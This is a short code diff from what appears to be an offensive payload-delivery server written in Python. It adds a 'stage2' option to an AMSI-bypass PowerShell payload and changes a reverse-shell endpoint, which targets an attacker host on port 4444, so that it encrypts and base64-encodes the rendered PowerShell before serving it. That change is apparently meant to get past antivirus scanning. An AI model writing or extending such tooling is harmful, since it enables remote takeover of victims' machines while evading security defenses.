@@ -135,6 +135,7 @@ def payload_0():
         "key": key,
         "strings": encrypted_strings,
         "symbol_name": symbol_name,
+        "stage2": 'r' if 'r' in request.args else '1',
     }
     result = render_template(
                     "amsi.ps1",
@@ -248,4 +249,9 @@ def reverse_shell():
         "IP": args.URI_HOST,
         "PORT": "4444",
     }
-    return render_template("reverse-shell.ps1", **context)
+    result = render_template(
+                    "reverse-shell.ps1",
+                    **context,
+    ).encode()
+    result = b64encode(encrypt(result, key))
+    return Response(result, content_type='text/plain; charset=utf-8')
